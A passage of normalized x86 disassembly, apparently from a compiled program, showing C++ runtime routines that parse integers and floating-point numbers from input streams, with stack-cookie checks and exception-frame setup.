mov edi [ ebp - 0x68 ]
add esp 0x10
mov [ ebp - 0x50 ] eax
test edi edi
je r-xdata
lea eax [ ebp - 0x70 ]
push eax
mov ecx esi
call sub_402e50
mov edi eax
mov [ ebp - 0x4 ] 0x0
call sub_40a480
mov [ ebp - 0x4 ] 0xffffffff
mov edi [ ebp - 0x70 ]
mov ebx eax
test edi edi
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x64 ] eax
je r-xdata
push 0x0
lea ecx [ ebp - 0x5c ]
call sub_436188
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
lea esi [ ebp - 0x4c ]
call sub_41c930
lea esi [ ebp - 0x2c ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x1
call sub_409820
push 0x0
push eax
or eax 0xffffffff
lea edi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_406d90
mov edi 0x8
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x18 ] edi
jb r-xdata
push 0x0
lea ecx [ ebp - 0x50 ]
call sub_436188
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
call sub_41f260
test al al
mov eax [ ebp - 0x58 ]
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x5c ]
not esi
call sub_4361b0
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov esi [ ebp - 0x3c ]
or edx 0xffffffff
sub edx esi
cmp edx 0x1
ja r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_43811c
add esp 0x4
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x50 ]
not esi
call sub_4361b0
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
test ebx ebx
jns r-xdata
or [ eax ] 0x1
mov eax [ ebp - 0x50 ]
cmp eax 0x1
ja r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
inc esi
lea eax [ ebp - 0x4c ]
call sub_401ef0
test al al
je r-xdata
push r--data
call sub_435a79
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
mov edx [ ebp - 0x6c ]
setne cl
mov [ edx ] cl
or [ eax ] 0x2
jmp r-xdata
mov ebx eax
lea esi [ ebp - 0x2c ]
mov ecx ebx
call sub_427a10
push 0x0
push eax
or eax 0xffffffff
lea edi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
call sub_406d90
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ ebp - 0x4c ]
cmp [ ebp - 0x38 ] edi
jae r-xdata
mov eax [ ebp - 0x60 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x20
mov esi [ ebp - 0x38 ]
mov edi [ ebp - 0x4c ]
mov eax edi
cmp esi 0x8
jae r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
mov edx [ ebp - 0x3c ]
xor ecx ecx
mov [ eax + edx * 2 ] cx
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x3c ] esi
cmp [ ebp - 0x38 ] edi
jae r-xdata
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea ecx [ ebp + 0x14 ]
call sub_41ef20
add esp 0x8
mov ebx eax
mov [ ebp - 0x4 ] 0xffffffff
cmp esi 0x8
jb r-xdata
lea eax [ ebp - 0x4c ]
xor ecx ecx
mov [ eax + esi * 2 ] cx
lea eax [ ebp - 0x4c ]
push edi
call sub_43811c
add esp 0x4
jmp r-xdata
sub_41bd50
push ebp
mov ebp esp
push 0xffffffff
push sub_451658
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edx [ ebp + 0x24 ]
mov edi ecx
mov ecx [ ebp + 0x20 ]
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x50 ]
mov [ ebp - 0x38 ] ecx
xor ebx ebx
push eax
mov ecx esi
mov [ ebp - 0x44 ] edx
mov [ ebp - 0x3c ] ebx
call sub_402e50
push eax
mov [ ebp - 0x4 ] ebx
mov esi [ esi + 0x14 ]
push esi
lea ecx [ ebp + 0xc ]
push ecx
push edi
lea edx [ ebp + 0x14 ]
lea ecx [ ebp - 0x30 ]
call sub_41c990
mov ebx eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x50 ]
add esp 0x10
test eax eax
je r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
push 0x0
lea ecx [ ebp - 0x40 ]
mov edi eax
call sub_436188
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x30 ]
mov [ ebp - 0x34 ] edx
lea ecx [ ebp - 0x2f ]
mov [ ebp - 0x34 ] ecx
jmp r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x40 ]
not esi
call sub_4361b0
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov ecx [ ebp - 0x34 ]
cmp [ ebp - 0x4c ] ecx
je r-xdata
or [ eax ] 0x1
mov edx [ ebp - 0x34 ]
lea eax [ ebp - 0x3c ]
push eax
push ebx
lea ecx [ ebp - 0x4c ]
push ecx
push edx
call sub_43797a
add esp 0x10
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
mov ebx eax
call sub_41f260
test al al
mov eax [ ebp - 0x38 ]
je r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
or [ eax ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
cmp ebx 0xffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov edx [ ebp - 0x44 ]
mov [ edx ] bx
jmp r-xdata
neg ebx
mov eax [ ebp - 0x48 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x20
sub_41bea0
push ebp
mov ebp esp
push 0xffffffff
push sub_451658
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edx [ ebp + 0x24 ]
mov edi ecx
mov ecx [ ebp + 0x20 ]
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x50 ]
mov [ ebp - 0x38 ] ecx
xor ebx ebx
push eax
mov ecx esi
mov [ ebp - 0x44 ] edx
mov [ ebp - 0x3c ] ebx
call sub_402e50
push eax
mov [ ebp - 0x4 ] ebx
mov esi [ esi + 0x14 ]
push esi
lea ecx [ ebp + 0xc ]
push ecx
push edi
lea edx [ ebp + 0x14 ]
lea ecx [ ebp - 0x30 ]
call sub_41c990
mov ebx eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x50 ]
add esp 0x10
test eax eax
je r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
push 0x0
lea ecx [ ebp - 0x40 ]
mov edi eax
call sub_436188
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x30 ]
mov [ ebp - 0x34 ] edx
lea ecx [ ebp - 0x2f ]
mov [ ebp - 0x34 ] ecx
jmp r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x40 ]
not esi
call sub_4361b0
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov ecx [ ebp - 0x34 ]
cmp [ ebp - 0x4c ] ecx
je r-xdata
or [ eax ] 0x1
mov edx [ ebp - 0x34 ]
lea eax [ ebp - 0x3c ]
push eax
push ebx
lea ecx [ ebp - 0x4c ]
push ecx
push edx
call sub_43797a
add esp 0x10
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
mov ebx eax
call sub_41f260
test al al
mov eax [ ebp - 0x38 ]
je r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
or [ eax ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
cmp ebx 0xffffffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov edx [ ebp - 0x44 ]
mov [ edx ] ebx
jmp r-xdata
neg ebx
mov eax [ ebp - 0x48 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x20
sub_41bff0
push ebp
mov ebp esp
push 0xffffffff
push sub_451628
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi ecx
mov ecx [ ebp + 0x24 ]
lea edx [ ebp - 0x40 ]
mov [ ebp - 0x3c ] ecx
push edx
mov ecx esi
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x34 ] 0x0
call sub_402e50
lea ecx [ ebp - 0x34 ]
push ecx
push eax
mov [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x14 ]
push esi
lea edx [ ebp + 0xc ]
push edx
push edi
lea edx [ ebp + 0x14 ]
lea ecx [ ebp - 0x30 ]
call sub_41c990
add esp 0x10
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x30 ]
push ecx
call sub_4375e1
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x40 ]
add esp 0x10
test eax eax
je r-xdata
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
call sub_41f260
test al al
je r-xdata
push 0x0
lea ecx [ ebp - 0x4c ]
mov edi eax
call sub_436188
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x30 ]
cmp [ ebp - 0x38 ] ecx
je r-xdata
or [ ebx ] 0x1
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x4c ]
not esi
call sub_4361b0
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
mov edx [ ebp - 0x48 ]
mov eax [ ebp - 0x3c ]
mov [ eax ] edx
jmp r-xdata
mov eax [ ebp - 0x44 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x20
sub_41c120
push ebp
mov ebp esp
push 0xffffffff
push sub_451628
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi ecx
mov ecx [ ebp + 0x24 ]
lea edx [ ebp - 0x40 ]
mov [ ebp - 0x3c ] ecx
push edx
mov ecx esi
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x34 ] 0x0
call sub_402e50
lea ecx [ ebp - 0x34 ]
push ecx
push eax
mov [ ebp - 0x4 ] 0x0
mov esi [ esi + 0x14 ]
push esi
lea edx [ ebp + 0xc ]
push edx
push edi
lea edx [ ebp + 0x14 ]
lea ecx [ ebp - 0x30 ]
call sub_41c990
add esp 0x10
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x30 ]
push ecx
call sub_43797a
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x40 ]
add esp 0x10
test eax eax
je r-xdata
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
call sub_41f260
test al al
je r-xdata
push 0x0
lea ecx [ ebp - 0x4c ]
mov edi eax
call sub_436188
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x30 ]
cmp [ ebp - 0x38 ] ecx
je r-xdata
or [ ebx ] 0x1
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x4c ]
not esi
call sub_4361b0
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
or [ ebx ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
mov edx [ ebp - 0x48 ]
mov eax [ ebp - 0x3c ]
mov [ eax ] edx
jmp r-xdata
mov eax [ ebp - 0x44 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x20
sub_41c250
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4515f8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x40 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi ecx
mov ecx [ ebp + 0x24 ]
lea edx [ esp + 0x20 ]
mov [ esp + 0x18 ] ecx
push edx
mov ecx esi
mov [ esp + 0x20 ] eax
mov [ esp + 0x14 ] 0x0
call sub_402e50
lea ecx [ esp + 0x10 ]
push ecx
push ecx
push eax
mov [ esp + 0x6c ] 0x0
mov esi [ esi + 0x14 ]
push esi
lea edx [ ebp + 0xc ]
push edx
push edi
lea edx [ ebp + 0x14 ]
lea ecx [ esp + 0x48 ]
call sub_41c990
add esp 0x14
push eax
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x3c ]
push ecx
call sub_4376a8
mov [ esp + 0x34 ] eax
mov [ esp + 0x70 ] 0xffffffff
mov eax [ esp + 0x30 ]
add esp 0x10
mov [ esp + 0x28 ] edx
test eax eax
je r-xdata
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
call sub_41f260
test al al
je r-xdata
push 0x0
lea ecx [ esp + 0x30 ]
mov edi eax
call sub_436188
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x30 ]
cmp [ esp + 0x14 ] ecx
je r-xdata
or [ ebx ] 0x1
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ esp + 0x2c ]
not esi
call sub_4361b0
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
or [ ebx ] 0x2
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x24 ]
mov ecx [ esp + 0x28 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax [ esp + 0x1c ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x40 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x20
sub_41c3b0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4515f8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x40 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi ecx
mov ecx [ ebp + 0x24 ]
lea edx [ esp + 0x20 ]
mov [ esp + 0x18 ] ecx
push edx
mov ecx esi
mov [ esp + 0x20 ] eax
mov [ esp + 0x14 ] 0x0
call sub_402e50
lea ecx [ esp + 0x10 ]
push ecx
push ecx
push eax
mov [ esp + 0x6c ] 0x0
mov esi [ esi + 0x14 ]
push esi
lea edx [ ebp + 0xc ]
push edx
push edi
lea edx [ ebp + 0x14 ]
lea ecx [ esp + 0x48 ]
call sub_41c990
add esp 0x14
push eax
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x3c ]
push ecx
call sub_43776b
mov [ esp + 0x34 ] eax
mov [ esp + 0x70 ] 0xffffffff
mov eax [ esp + 0x30 ]
add esp 0x10
mov [ esp + 0x28 ] edx
test eax eax
je r-xdata
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
call sub_41f260
test al al
je r-xdata
push 0x0
lea ecx [ esp + 0x30 ]
mov edi eax
call sub_436188
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x30 ]
cmp [ esp + 0x14 ] ecx
je r-xdata
or [ ebx ] 0x1
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ esp + 0x2c ]
not esi
call sub_4361b0
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
or [ ebx ] 0x2
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x24 ]
mov ecx [ esp + 0x28 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax [ esp + 0x1c ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x40 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x20
sub_41c510
push ebp
mov ebp esp
sub esp 0x58
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp + 0x24 ]
push ebx
mov ebx [ ebp + 0x20 ]
mov [ ebp - 0x58 ] eax
push esi
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
mov edx ecx
mov ecx [ ebp + 0x1c ]
xor esi esi
push eax
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x44 ] esi
call sub_41cea0
add esp 0x10
push eax
lea ecx [ ebp - 0x50 ]
push ecx
lea edx [ ebp - 0x40 ]
push edx
call sub_437686
fstp [ ebp - 0x48 ]
mov eax [ ebp - 0x44 ]
add esp 0x10
cmp eax esi
je r-xdata
push edi
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
call sub_41f260
pop edi
test al al
je r-xdata
fld [ ebp - 0x48 ]
add eax eax
add eax eax
push eax
sub esp 0x8
fstp [ esp ]
call sub_43a192
fstp [ ebp - 0x44 ]
add esp 0xc
fld [ ebp - 0x44 ]
fstp [ ebp - 0x48 ]
lea ecx [ ebp - 0x40 ]
cmp [ ebp - 0x50 ] ecx
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
cmp [ ebp - 0x4c ] 0x0
jne r-xdata
fld [ ebp - 0x48 ]
mov edx [ ebp - 0x58 ]
fstp [ edx ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x54 ]
mov edx [ ebp + 0x10 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
mov [ eax + 0x4 ] edx
pop ebx
call sub_437c1c
mov esp ebp
pop ebp
retn 0x20
sub_41c5f0
push ebp
mov ebp esp
and esp 0xffffffc0
sub esp 0x74
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x70 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x20 ]
mov [ esp + 0x28 ] eax
mov eax [ ebp + 0x24 ]
push esi
mov [ esp + 0x28 ] eax
push edi
lea eax [ esp + 0x28 ]
push eax
mov edx ecx
mov ecx [ ebp + 0x1c ]
push ecx
lea eax [ esp + 0x2c ]
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ esp + 0x54 ]
xor esi esi
push eax
mov [ esp + 0x40 ] esi
mov [ esp + 0x3c ] esi
call sub_41cea0
add esp 0x14
push eax
lea ecx [ esp + 0x3c ]
push ecx
lea edx [ esp + 0x4c ]
push edx
call sub_437b16
fst [ esp + 0x48 ]
mov eax [ esp + 0x34 ]
add esp 0x10
cmp eax esi
je r-xdata
fstp st0
add eax eax
add eax eax
push eax
sub esp 0x8
fstp [ esp ]
call sub_43a192
fstp [ esp + 0x44 ]
add esp 0xc
jmp r-xdata
lea ecx [ esp + 0x40 ]
cmp [ esp + 0x34 ] ecx
je r-xdata
or [ ebx ] 0x1
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
call sub_41f260
test al al
je r-xdata
or [ ebx ] 0x2
cmp [ esp + 0x28 ] 0x0
jne r-xdata
fld [ esp + 0x38 ]
mov edx [ esp + 0x2c ]
fstp [ edx ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ esp + 0x30 ]
mov edx [ ebp + 0x10 ]
pop edi
mov [ eax ] ecx
mov ecx [ esp + 0x78 ]
pop esi
pop ebx
xor ecx esp
mov [ eax + 0x4 ] edx
call sub_437c1c
mov esp ebp
pop ebp
retn 0x20
sub_41c6e0
push ebp
mov ebp esp
and esp 0xffffffc0
sub esp 0x74
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x70 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x20 ]
mov [ esp + 0x28 ] eax
mov eax [ ebp + 0x24 ]
push esi
mov [ esp + 0x28 ] eax
push edi
lea eax [ esp + 0x28 ]
push eax
mov edx ecx
mov ecx [ ebp + 0x1c ]
push ecx
lea eax [ esp + 0x2c ]
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ esp + 0x54 ]
xor esi esi
push eax
mov [ esp + 0x40 ] esi
mov [ esp + 0x3c ] esi
call sub_41cea0
add esp 0x14
push eax
lea ecx [ esp + 0x3c ]
push ecx
lea edx [ esp + 0x4c ]
push edx
call sub_43796f
fst [ esp + 0x48 ]
mov eax [ esp + 0x34 ]
add esp 0x10
cmp eax esi
je r-xdata
fstp st0
add eax eax
add eax eax
push eax
sub esp 0x8
fstp [ esp ]
call sub_43a192
fstp [ esp + 0x44 ]
add esp 0xc
jmp r-xdata
lea ecx [ esp + 0x40 ]
cmp [ esp + 0x34 ] ecx
je r-xdata
or [ ebx ] 0x1
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
call sub_41f260
test al al
je r-xdata
or [ ebx ] 0x2
cmp [ esp + 0x28 ] 0x0
jne r-xdata
fld [ esp + 0x38 ]
mov edx [ esp + 0x2c ]
fstp [ edx ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ esp + 0x30 ]
mov edx [ ebp + 0x10 ]
pop edi
mov [ eax ] ecx
mov ecx [ esp + 0x78 ]
pop esi
pop ebx
xor ecx esp
mov [ eax + 0x4 ] edx
call sub_437c1c
mov esp ebp
pop ebp
retn 0x20
sub_41c7d0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4515c8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x40 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x24 ]
mov ebx [ ebp + 0x20 ]
mov [ esp + 0x28 ] eax
lea eax [ esp + 0x24 ]
mov esi ecx
mov ecx [ ebp + 0x1c ]
xor edi edi
push eax
mov [ esp + 0x24 ] edx
mov [ esp + 0x14 ] edi
call sub_402e50
push eax
push 0x800
lea ecx [ ebp + 0xc ]
push ecx
push esi
lea edx [ ebp + 0x14 ]
lea ecx [ esp + 0x40 ]
mov [ esp + 0x70 ] edi
call sub_41c990
mov [ esp + 0x24 ] eax
mov [ esp + 0x70 ] 0xffffffff
mov eax [ esp + 0x34 ]
add esp 0x10
cmp eax edi
je r-xdata
mov edx [ esp + 0x14 ]
lea ecx [ esp + 0x10 ]
push ecx
push edx
lea eax [ esp + 0x24 ]
push eax
lea ecx [ esp + 0x3c ]
push ecx
call sub_43797a
add esp 0x10
lea edi [ ebp + 0x14 ]
lea esi [ ebp + 0xc ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] 0x0
call sub_41f260
test al al
je r-xdata
push 0x0
lea ecx [ esp + 0x30 ]
mov edi eax
call sub_436188
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
lea edx [ esp + 0x30 ]
cmp [ esp + 0x1c ] edx
je r-xdata
or [ ebx ] 0x1
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ esp + 0x2c ]
not esi
call sub_4361b0
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
or [ ebx ] 0x2
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x20 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ esp + 0x28 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x40 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn 0x20
sub_41c930
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
cmp [ esi + 0x14 ] 0x1
jae r-xdata
mov ecx 0x8
cmp [ esi + 0x14 ] ecx
jb r-xdata
mov ecx [ esi + 0x10 ]
push ecx
push 0x1
push esi
call sub_402170
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
xor ecx ecx
mov [ eax + 0x2 ] cx
retn
mov eax [ esi ]
xor ecx ecx
mov [ eax + 0x2 ] cx
mov eax esi
retn
xor edx edx
mov [ eax ] dx
mov [ esi + 0x10 ] 0x1
cmp [ esi + 0x14 ] ecx
jb r-xdata
sub_41c990
push ebp
mov ebp esp
push 0xffffffff
push sub_451590
mov eax [ fs : 0x0 ]
push eax
sub esp 0x6c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x6c ] ecx
mov [ ebp - 0x70 ] edx
call sub_40a480
mov edi eax
lea esi [ ebp - 0x48 ]
mov ecx edi
call sub_427c60
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
mov eax [ edi ]
mov edx [ eax + 0x8 ]
